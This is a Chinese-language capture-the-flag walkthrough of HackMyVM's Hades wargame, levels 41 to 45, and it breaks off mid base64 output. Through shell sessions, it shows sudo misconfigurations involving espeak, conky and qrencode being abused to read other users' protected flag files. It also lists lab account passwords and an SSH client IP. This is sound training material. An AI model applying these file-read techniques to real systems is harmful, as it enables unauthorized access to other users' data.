## 41 leda
```bash
leda@hades:~$ ls -la
total 32
drwxr-x--- 2 root leda 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 leda leda  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 leda leda 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 leda leda  807 Apr 23  2023 .profile
-rw-r----- 1 root leda   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root leda  129 Apr  5 06:36 mission.txt
leda@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^wHseqgzsZUNyruSnxnl^
leda@hades:~$ cat mission.txt 
################
# MISSION 0x41 #
################

## EN ##
User maia hears everything. 

## ES ##
La usuaria maia lo oye todo.
leda@hades:~$ sudo -l
Matching Defaults entries for leda on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User leda may run the following commands on hades:
    (maia) NOPASSWD: /usr/bin/espeak
```
参考： https://gtfobins.github.io/gtfobins/espeak/
```bash
leda@hades:~$ sudo -u maia /usr/bin/espeak -qXf /pwned/maia/flagz.txt
Translate '^'
Found: '_^' [s3:kVmfl,Eks]  
Found: 'g' [dZi:]  
Unpronouncable? 'ws'
Found: 'w' [d'Vb@Lju:]  
Found: '_s' [E2s]  
Unpronouncable? 'dbt'
Found: 'd' [di:]  
Found: 'b' [bi:]  
Found: 't' [ti:]  
Translate 'ci'
  1     c        [k]
 22     c (i     [s]

 22     i (_     [i]
  1     i        [I]
 44     XC) i (_ [aI]
 43     c) i (_  [aI]

Unpronouncable? 'xd'
Found: 'x' [E2ks]
Found: 'd' [di:]
Unpronouncable? 'zd'
Found: 'z' [zE2d]
Found: 'd' [di:]
Unpronouncable? 'nt'
Found: 'n' [E2n]
Found: 't' [ti:]
Unpronouncable? 'rz'
Found: 'r' [A@]
Found: 'z' [zE2d]
Unpronouncable? 'vgt'
Found: 'v' [vi:]
Found: 'g' [dZi:]
Found: 't' [ti:]
Translate '^'
Found: '_^' [s3:kVmfl,Eks]
 dZ'i: d,Vb@Lj,u:'Es d,i:b,i:t'i: s'aI ,Eksd'i: z,Edd'i:; ,Ent'i:; ,A@z'Ed v,i:dZ,i:t'i:

```
尝试拼接到一起：`^gwsdbtcixdzdntrzvgt^`

## 42 maia
41: maia/GIVEMEANEWMIND
```bash
maia@hades:~$ ls -la
total 40
drwxr-x--- 2 root maia 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 maia maia  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 maia maia 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 maia maia  807 Apr 23  2023 .profile
-rw-r----- 1 root maia 7299 Apr  5 06:36 broken
-rw-r----- 1 root maia   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root maia  169 Apr  5 06:36 mission.txt
maia@hades:~$ cat flagz.txt 
^GWsDBTCiXdZDNtRzVGt^
maia@hades:~$ cat mission.txt 
################
# MISSION 0x42 #
################

## EN ##
It seems that user nephele has broken the image.

## ES ##
Parece que la usuaria nephele ha roto la imagen.
maia@hades:~$ find / -user nephele 2>/dev/null | grep -v proc
maia@hades:~$ find / -group nephele 2>/dev/null | grep -v proc
/pwned/nephele
```
下载到本地进行分析：
```bash
hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ scp -P 6666 maia@hades.hackmyvm.eu:/pwned/maia/broken .

                                                      .     **                                   
                                                   *           *.                                 
                                                                  ,*                              
                                                                     *,                            
                                             ,                         ,*                         
                                          .,                              *,                       
                                       /                                    *                    
                                    ,*                                        *,                  
                                 /.                                            .*.                 
                                                                _____                     
                __     __           _____         ____________      _____\    \            _____   
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \  
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


maia@hades.hackmyvm.eu's password: 
broken                                                                                                                                              100% 7299    25.2KB/s   00:00    
```
想反编译一下，但是去除了调试信息：
```bash
hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ strings broken
IHDR
sRGB
gAMA
        pHYs
IDATx^
fXLb
]%uK
        Yo/
ku{/w-
fo1//
kF,w
/&gB
zF-k
6Uu#
y.d9
'eor
z_gc
upw1M
U^lk
FxZn
)r&\
9r&\
?|L/SS
0:,_
D{&4
-<37
UCYQ\=
1r&\hf
/e[?
cXvks
5x{;u
s7Ywo
r\{^yl
p?r&\
Bw=]
@/.5U
wruru
~i_A
R}lq
w7>|
G'V/
gt[]^87
vuFup
ohVQS]LW
rxG.
WMlnSxy
Uw])
        ;k9s
)o>_~
IEND
hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ file broken 
broken: data
```
看起来有点像png，但是nuix又识别不出来，尝试文件包含进行提取：
```bash
gbe02@pwn:/mnt/c/Users/Administrator/Desktop$ binwalk broken 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
91            0x5B            Zlib compressed data, compressed

hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ binwalk -e broken

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
91            0x5B            Zlib compressed data, compressed

hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ cd _broken.extracted/
hgbe02@pwn:/mnt/c/Users/Administrator/Desktop/_broken.extracted$ ls -la
total 1888
drwxrwxrwx 1 hgbe02 hgbe02    4096 Jul  4 23:43 .
drwxrwxrwx 1 hgbe02 hgbe02    4096 Jul  4 23:43 ..
-rwxrwxrwx 1 hgbe02 hgbe02 1921448 Jul  4 23:43 5B
-rwxrwxrwx 1 hgbe02 hgbe02    7208 Jul  4 23:43 5B.zlib
hgbe02@pwn:/mnt/c/Users/Administrator/Desktop/_broken.extracted$ file 5B
5B: data
```
不对劲，误入歧途了估计，尝试进行修复，打开010editor，给文件头加上：
```text
89 50 4E 47 OD 0A 1A 00
%PNG (只是一个像png的字符) 
```
接上即可，另存为 png，得到flag！！！**rZtaitCxlEIRxBayVpgZ**

## 43 nephele
```bash
nephele@hades:~$ ls -la
total 32
drwxr-x--- 2 root    nephele 4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root    4096 Apr  5 06:36 ..
-rw-r--r-- 1 nephele nephele  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 nephele nephele 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 nephele nephele  807 Apr 23  2023 .profile
-rw-r----- 1 root    nephele   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    nephele  179 Apr  5 06:36 mission.txt
nephele@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^oSiWofNrDjNWbcAqMAx^
nephele@hades:~$ cat mission.txt 
################
# MISSION 0x43 #
################

## EN ##
The nyx user visits some websites that we do not know.

## ES ##
La usuaria nyx visita algunas webs que no conocemos.
nephele@hades:~$ set 
BASH=/bin/bash
BASHOPTS=checkwinsize:cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:globasciiranges:globskipdots:histappend:hostcomplete:interactive_comments:login_shell:patsub_replacement:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=([0]="0")
BASH_ARGV=()
BASH_CMDS=()
BASH_LINENO=()
BASH_LOADABLES_PATH=/usr/local/lib/bash:/usr/lib/bash:/opt/local/lib/bash:/usr/pkg/lib/bash:/opt/pkg/lib/bash:.
BASH_SOURCE=()
BASH_VERSINFO=([0]="5" [1]="2" [2]="15" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
BASH_VERSION='5.2.15(1)-release'
COLUMNS=182
DIRSTACK=()
EUID=2034
GROUPS=()
HISTCONTROL=ignoreboth
HISTFILE=/pwned/nephele/.bash_history
HISTFILESIZE=2000
HISTSIZE=1000
HOME=/pwned/nephele
HOSTNAME=hades
HOSTTYPE=x86_64
IFS=$' \t\n'
LINES=18
LOGNAME=nephele
LS_COLORS='rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*
.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=
01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;3
1:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:
*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;
35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=
01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35
:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:
*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.swp=00;90:*.tmp=00;90:*.dpkg-dist=00;90:*.dpkg-old=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:'
MACHTYPE=x86_64-pc-linux-gnu
MAILCHECK=60
MOTD_SHOWN=pam
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
PIPESTATUS=([0]="0")
PPID=38905
PS1='\[\e]0;\u@\h: \w\a\]${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
PS2='> '
PS4='+ '
PWD=/pwned/nephele
SHELL=/bin/bash
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
SHLVL=1
SSH_CLIENT='117.136.30.115 60585 22'
SSH_CONNECTION='117.136.30.115 60585 172.66.0.66 22'
SSH_TTY=/dev/pts/2
TERM=xterm-256color
UID=2034
USER=nephele
_=mission.txt
nephele@hades:~$ cat /etc/hosts 
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.66.0.66     hades
127.0.0.1       hades.hmv
127.0.0.1       whatsmypass.hmv
nephele@hades:~$ curl whatsmypass.hmv
HXisrOPSdTcSSTEyyaLn
nephele@hades:~$ ls -la /dev/mqueue/linpeas.txt1233
-rw-r--r-- 1 nephele nephele 80 Jul  4 11:04 /dev/mqueue/linpeas.txt1233
nephele@hades:~$ cat /dev/mqueue/linpeas.txt1233
QSIZE:0          NOTIFY:0     SIGNO:0     NOTIFY_PID:0
nephele@hades:~$ find / -group nephele 2>/dev/null | grep -v proc
/dev/mqueue/linpeas.txt1233
/var/tmp/a.zip
/pwned/nephele
/pwned/nephele/.bash_logout
/pwned/nephele/.bashrc
/pwned/nephele/flagz.txt
/pwned/nephele/mission.txt
/pwned/nephele/.profile
nephele@hades:~$ curl -is http://whatsmypass.hmv
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Thu, 04 Jul 2024 17:12:17 GMT
Content-Type: text/html
Content-Length: 21
Last-Modified: Wed, 14 Sep 1988 00:01:36 GMT
Connection: keep-alive
ETag: "232db6e0-15"
Accept-Ranges: bytes
```
听群主说这里有个隐藏 flag，嘶。。。。。

## 44 nyx
```bash
nyx@hades:~$ ls -la
total 32
drwxr-x--- 2 root nyx  4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 nyx  nyx   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 nyx  nyx  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 nyx  nyx   807 Apr 23  2023 .profile
-rw-r----- 1 root nyx    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root nyx   171 Apr  5 06:36 mission.txt
nyx@hades:~$ grep -ir '\^*\^' .
    ./flagz.txt:^BdYvJtfaTyfaliZPBkG^
nyx@hades:~$ cat mission.txt 
################
# MISSION 0x44 #
################

## EN ##
User pallas has her desktop tuned with conky.

## ES ##
La usuaria pallas tiene su desktop tuneado con conky.
nyx@hades:~$ sudo -l
Matching Defaults entries for nyx on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User nyx may run the following commands on hades:
    (pallas) NOPASSWD: /usr/bin/conky
```
搜了一下发现这是一个监控软件，且可以使用自己写的配置文件进行加载，尝试配置一下：
```bash
nyx@hades:~$ /usr/bin/conky -h
Usage: /usr/bin/conky [OPTION]...
conky is a system monitor that renders text on desktop or to own transparent
window. Command line options will override configurations defined in config
file.
   -v, --version             version
   -q, --quiet               quiet mode
   -D, --debug               increase debugging output, ie. -DD for more debugging
   -c, --config=FILE         config file to load
   -C, --print-config        print the builtin default config to stdout
                             e.g. 'conky -C > ~/.conkyrc' will create a new default config
   -d, --daemonize           daemonize, fork to background
   -h, --help                help
   -a, --alignment=ALIGNMENT text alignment on screen, {top,bottom,middle}_{left,right,middle}
   -X, --display=DISPLAY     X11 display to use
   -m, --xinerama-head=N     Xinerama monitor index (0=first)
   -f, --font=FONT           font to use
   -o, --own-window          create own window to draw
   -b, --double-buffer       double buffer (prevents flickering)
   -w, --window-id=WIN_ID    window id to draw
   -x X                      x position
   -y Y                      y position
   -t, --text=TEXT           text to render, remember single quotes, like -t '$uptime'
   -u, --interval=SECS       update interval
   -i COUNT                  number of times to update conky (and quit)
   -p, --pause=SECS          pause for SECS seconds at startup before doing anything
nyx@hades:~$ ls -la /etc/conky/conky*
-rw-r--r-- 1 root root 2335 Jul 22  2019 /etc/conky/conky.conf
-rw-r--r-- 1 root root 1264 Feb  6  1998 /etc/conky/conky_no_x11.conf
nyx@hades:~$ cat /etc/conky/conky.conf
-- Conky, a system monitor https://github.com/brndnmtthws/conky
--
-- This configuration file is Lua code. You can write code in here, and it will
-- execute when Conky loads. You can use it to generate your own advanced
-- configurations.
--
-- Try this (remove the `--`):
--
--   print("Loading Conky config")
--
-- For more on Lua, see:
-- https://www.lua.org/pil/contents.html

conky.config = {
    alignment = 'top_left',
    background = false,
    border_width = 1,
    cpu_avg_samples = 2,
    default_color = 'white',
    default_outline_color = 'white',
    default_shade_color = 'white',
    double_buffer = true,
    draw_borders = false,
    draw_graph_borders = true,
    draw_outline = false,
    draw_shades = false,
    extra_newline = false,
    font = 'DejaVu Sans Mono:size=12',
    gap_x = 60,
    gap_y = 60,
    minimum_height = 5,
    minimum_width = 5,
    net_avg_samples = 2,
    no_buffers = true,
    out_to_console = false,
    out_to_ncurses = false,
    out_to_stderr = false,
    out_to_x = true,
    own_window = true,
    own_window_class = 'Conky',
    own_window_type = 'desktop',
    show_graph_range = false,
    show_graph_scale = false,
    stippled_borders = 0,
    update_interval = 1.0,
    uppercase = false,
    use_spacer = 'none',
    use_xft = true,
}

conky.text = [[
${color grey}Info:$color ${scroll 32 Conky $conky_version - $sysname $nodename $kernel $machine}
$hr
${color grey}Uptime:$color $uptime
${color grey}Frequency (in MHz):$color $freq
${color grey}Frequency (in GHz):$color $freq_g
${color grey}RAM Usage:$color $mem/$memmax - $memperc% ${membar 4}
${color grey}Swap Usage:$color $swap/$swapmax - $swapperc% ${swapbar 4}
${color grey}CPU Usage:$color $cpu% ${cpubar 4}
${color grey}Processes:$color $processes  ${color grey}Running:$color $running_processes
$hr
${color grey}File systems:
 / $color${fs_used /}/${fs_size /} ${fs_bar 6 /}
${color grey}Networking:
Up:$color ${upspeed} ${color grey} - Down:$color ${downspeed}
$hr
${color grey}Name              PID     CPU%   MEM%
${color lightgrey} ${top name 1} ${top pid 1} ${top cpu 1} ${top mem 1}
${color lightgrey} ${top name 2} ${top pid 2} ${top cpu 2} ${top mem 2}
${color lightgrey} ${top name 3} ${top pid 3} ${top cpu 3} ${top mem 3}
${color lightgrey} ${top name 4} ${top pid 4} ${top cpu 4} ${top mem 4}
]]
```
进行修改使其执行自己的命令！
```bash
${cat /pwned/pallas/flagz.txt}

nyx@hades:/var/tmp$ nano config
Unable to create directory /pwned/nyx/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

nyx@hades:/var/tmp$ mv config temp.conf  
nyx@hades:/var/tmp$ sudo -u pallas /usr/bin/conky -c /var/tmp/temp.conf
can't open display: 
conky: drawing to single buffer
conky: invalid setting of type 'table'
^Cconky: received SIGHUP, SIGINT, or SIGTERM to terminate. bye!
Segmentation fault
```
太慢了，删除部分配置文件:
```bash
conky.config = {
    alignment = 'top_left',
    background = false,
    border_width = 1,
    cpu_avg_samples = 2,
    default_color = 'white',
    default_outline_color = 'white',
    default_shade_color = 'white',
    double_buffer = true,
    draw_borders = false,
    draw_graph_borders = true,
    draw_outline = false,
    draw_shades = false,
    extra_newline = false,
    font = 'DejaVu Sans Mono:size=12',
    gap_x = 60,
    gap_y = 60,
    minimum_height = 5,
    minimum_width = 5,
    net_avg_samples = 2,
    no_buffers = true,
    out_to_console = false,
    out_to_ncurses = false,
    out_to_stderr = false,
    out_to_x = true,
    own_window = true,
    own_window_class = 'Conky',
    own_window_type = 'desktop',
    show_graph_range = false,
    show_graph_scale = false,
    stippled_borders = 0,
    update_interval = 1.0,
    uppercase = false,
    use_spacer = 'none',
    use_xft = true,
}
conky.text = [[
${cat /pwned/pallas/flagz.txt}
]]
```
使用 cat 获取不了，换成 head 进行读取：
```bash
nyx@hades:/var/tmp$ head -n 5 temp.conf 
conky.config = {
    alignment = 'top_left',
    background = false,
    border_width = 1,
    cpu_avg_samples = 2,
nyx@hades:/var/tmp$ tail -n 5 temp.conf 
}

conky.text = [[
${head -n 10 /pwned/pallas/flagz.txt}
]]
nyx@hades:/var/tmp$ sudo -u pallas /usr/bin/conky -c /var/tmp/temp.conf
can't open display: 
conky: drawing to single buffer
conky: invalid setting of type 'table'
^Cconky: received SIGHUP, SIGINT, or SIGTERM to terminate. bye!
Segmentation fault
nyx@hades:/var/tmp$ sudo -u pallas /usr/bin/conky -c /var/tmp/temp.conf
can't open display: 
conky: drawing to single buffer
conky: invalid setting of type 'table'
conky: head needs a file as 1st and a number of lines as 2nd argument
***** Imlib2 Developer Warning ***** :
        This program is calling the Imlib call:

        imlib_context_free();

        With the parameter:

        context

        being NULL. Please fix your program.
```
按照提示进行修改第一个参数是文件，第二个参数是截至到第几个:
```bash
nyx@hades:/var/tmp$ nano temp.conf
Unable to create directory /pwned/nyx/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

nyx@hades:/var/tmp$ tail -n 3 temp.conf
conky.text = [[
${head /pwned/pallas/flagz.txt 10}
]]
nyx@hades:/var/tmp$ sudo -u pallas /usr/bin/conky -c /var/tmp/temp.conf
can't open display: 
conky: drawing to single buffer
conky: invalid setting of type 'table'
^Cconky: received SIGHUP, SIGINT, or SIGTERM to terminate. bye!
Segmentation fault
```
还是不行，再修改一下配置文件试试：
```bash
conky.config = {
    alignment = 'top_left',
    background = false,
    border_width = 1,
    cpu_avg_samples = 2,
    default_color = 'white',
    default_outline_color = 'white',
    default_shade_color = 'white',
    double_buffer = true,
    draw_borders = false,
    draw_graph_borders = true,
    draw_outline = false,
    draw_shades = false,
    extra_newline = false,
    font = 'DejaVu Sans Mono:size=12',
    gap_x = 60,
    gap_y = 60,
    minimum_height = 5,
    minimum_width = 5,
    net_avg_samples = 2,
    no_buffers = true,
    out_to_console = false,
    out_to_ncurses = false,
    out_to_stderr = false,
    out_to_x = true,
    own_window = true,
    own_window_class = 'Conky',
    own_window_type = 'desktop',
    show_graph_range = false,
    show_graph_scale = false,
    stippled_borders = 0,
    update_interval = 1.0,
    uppercase = false,
    use_spacer = 'none',
    use_xft = true,
}
conky.text = [[
${cat /pwned/pallas/flagz.txt}
]]
```

向 chatgpt 问一下配置文件都是啥意思：
```bash
conky.config = {           
    alignment = 'top_left',            # 文本对齐方式，'top_left' 表示左上角对齐
    
    background = false,                # 是否为背景着色，false 表示不使用背景色
    border_width = 1,                  # 边框宽度，以像素为单位
    cpu_avg_samples = 2,               # CPU平均负载样本数，用于计算平均CPU使用率  
    default_color = 'white',           # 默认文本颜色  
    default_outline_color = 'white',   # 默认边框颜色  
    default_shade_color = 'white',     # 默认阴影颜色（如果启用了阴影效果）
    double_buffer = true,              # 是否启用双缓冲，以减少屏幕闪烁
    draw_borders = false,              # 是否绘制边框
    draw_graph_borders = true,         # 是否绘制图表的边框
    draw_outline = false,              # 是否绘制文本的轮廓（阴影效果）
    draw_shades = false,               # 是否绘制阴影效果 
    extra_newline = false,             # 是否在文本之间添加额外的换行符
    font = 'DejaVu Sans Mono:size=12', # 使用的字体及其大小
    gap_x = 60,                        # 水平间隔，以像素为单位
    gap_y = 60,                        # 垂直间隔，以像素为单位
    minimum_height = 5,                # 最小高度，以字符为单位
    minimum_width = 5,                 # 最小宽度，以字符为单位
    net_avg_samples = 2,               # 网络平均负载样本数，用于计算平均网络使用率
    no_buffers = true,                 # 是否忽略缓冲区大小，对于某些网络或磁盘指标可能有用
    out_to_console = flase,            # 是否将输出发送到控制台
    out_to_ncurses = false,            # 是否将输出发送到ncurses（一种文本用户界面库）
    out_to_stderr = false,             # 是否将输出发送到标准错误（stderr）
    out_to_x = true,                   # 是否将输出发送到X窗口系统（通常是桌面环境） 
    own_window = true,                 # 是否使用自己的窗口来显示conky  
    own_window_class = 'Conky',        # 窗口的类名，可用于窗口管理器中的规则  
    own_window_type = 'desktop',       # 窗口的类型，'desktop' 表示这是一个桌面窗口  
    show_graph_range = false,          # 是否显示图表的范围  
    show_graph_scale = false,          # 是否显示图表的刻度
    stippled_borders = 0,              # 边框的条纹样式（0 表示无条纹）
    update_interval = 1.0,             # 更新间隔，以秒为单位
    uppercase = false,                 # 是否将文本转换为大写  
    use_spacer = 'none',               # 使用的间隔符类型，'none' 表示不使用间隔符 
    use_xft = true,                    # 是否使用X字体技术（Xft）来渲染字体  
}
```
我们修改几个非必要参数：

> out_to_console = true,
> out_to_x = false,

然后运行即可！！！
```bash
nyx@hades:/var/tmp$ nano temp.conf
Unable to create directory /pwned/nyx/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

nyx@hades:/var/tmp$ sudo -u pallas /usr/bin/conky -c /var/tmp/temp.conf
conky: drawing to single buffer
conky: invalid setting of type 'table'
^irzKewMCfnhnIMTCJlW^
^irzKewMCfnhnIMTCJlW^
^C^irzKewMCfnhnIMTCJlW^
conky: received SIGHUP, SIGINT, or SIGTERM to terminate. bye!
```

## 45 pallas
44: pallas/wWxyXnNbmjxNMEAIjbjT
```bash
pallas@hades:~$ ls -la
total 32
drwxr-x--- 2 root   pallas 4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root   4096 Apr  5 06:36 ..
-rw-r--r-- 1 pallas pallas  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 pallas pallas 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 pallas pallas  807 Apr 23  2023 .profile
-rw-r----- 1 root   pallas   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root   pallas  145 Apr  5 06:36 mission.txt
pallas@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^irzKewMCfnhnIMTCJlW^
pallas@hades:~$ cat mission.txt 
################
# MISSION 0x45 #
################

## EN ##
User pandora likes squares.

## ES ##
A la usuaria pandora le gustan los cuadrados.
pallas@hades:~$ sudo -l
Matching Defaults entries for pallas on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pallas may run the following commands on hades:
    (pandora) NOPASSWD: /usr/bin/qrencode
pallas@hades:~$ cat /etc/passwd | grep "squares"
pallas@hades:~$ find / -name squares 2>/dev/null
pallas@hades:~$ find / -user pandora 2>/dev/null | grep -v proc
/var/tmp/dummy.png
pallas@hades:~$ find / -group pandora 2>/dev/null | grep -v proc
/usr/bin/getty
/usr/bin/pandora
/var/tmp/dummy.png
/pwned/pandora
pallas@hades:~$ ls -la /usr/bin/pandora
-rw-r----- 1 root pandora 21 Apr  5 06:36 /usr/bin/pandora
pallas@hades:~$ ls -la /usr/bin/getty
-rwsr-sr-x 1 penelope pandora 69112 Apr  5 06:36 /usr/bin/getty
```

查看一下使用说明明显可以进行读取文件:
```bash
pallas@hades:~$ /usr/bin/qrencode
qrencode version 4.1.1
Copyright (C) 2006-2017 Kentaro Fukuchi
Usage: qrencode [-o FILENAME] [OPTION]... [STRING]
Encode input data in a QR Code and save as a PNG or EPS image.

  -h           display this message.
  --help       display the usage of long options.
  -o FILENAME  write image to FILENAME. If '-' is specified, the result
               will be output to standard output. If -S is given, structured
               symbols are written to FILENAME-01.png, FILENAME-02.png, ...
               (suffix is removed from FILENAME, if specified)
  -r FILENAME  read input data from FILENAME.
  -s NUMBER    specify module size in dots (pixels). (default=3)
  -l {LMQH}    specify error correction level from L (lowest) to H (highest).
               (default=L)
  -v NUMBER    specify the minimum version of the symbol. (default=auto)
  -m NUMBER    specify the width of the margins. (default=4 (2 for Micro))
  -d NUMBER    specify the DPI of the generated PNG. (default=72)
  -t {PNG,PNG32,EPS,SVG,XPM,ANSI,ANSI256,ASCII,ASCIIi,UTF8,UTF8i,ANSIUTF8,ANSIUTF8i,ANSI256UTF8}
               specify the type of the generated image. (default=PNG)
  -S           make structured symbols. Version number must be specified with '-v'.
  -k           assume that the input text contains kanji (shift-jis).
  -c           encode lower-case alphabet characters in 8-bit mode. (default)
  -i           ignore case distinctions and use only upper-case characters.
  -8           encode entire data in 8-bit mode. -k, -c and -i will be ignored.
  -M           encode in a Micro QR Code.
  -V           display the version number and copyrights of the qrencode.
  [STRING]     input data. If it is not specified, data will be taken from
               standard input.

  Try "qrencode --help" for more options.
pallas@hades:~$ sudo -l
Matching Defaults entries for pallas on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pallas may run the following commands on hades:
    (pandora) NOPASSWD: /usr/bin/qrencode
pallas@hades:~$ sudo -u pandora /usr/bin/qrencode -r /pwned/pandora/flagz.txt -o /var/tmp/temp_png
pallas@hades:~$ cat /var/tmp/temp_png
�PNG
⸮
IHDRcc��,�PLTE����ٟ�tRNS��ȵ��   pHYs

                                    ��~��IDAT8���1��
                                                     P#
w�
   �⸮�q%������Jt\�
��~��Ts�d�a�3͊#<S�Һ��$q� ��n8�$�*�J���X�U<
TZ�I��}��Q�x[��������:8ȋ����O4�x>�zO�Iz����a��?�0pWIEND�B`�pallas@hades:~$ base64 /var/tmp/temp_png
iVBORw0KGgoAAAANSUhEUgAAAGMAAABjAQMAAAC19SzWAAAABlBMVEUAAAD///+l2Z/dAAAAAnRS
TlP//8i138cAAAAJcEhZcwAACxIAAAsSAdLdfvwAAADtSURBVDiNzdQxjsQgDAVQIwp3kwsg5RrT
cSW4wLC5wOZKdFwDiQtAR4HWazQrbZqsU8xI6yoPyUr84wToWPCPVQE8DRVBSWo0fAef+EJSNM4a
lbj7gpD7LumBul0RDYfUfp/sVHO+ZPxh2jPNiiMcEjxTtRDSuvesJHHtHBuZIIn7bjgW0iQKS7Um
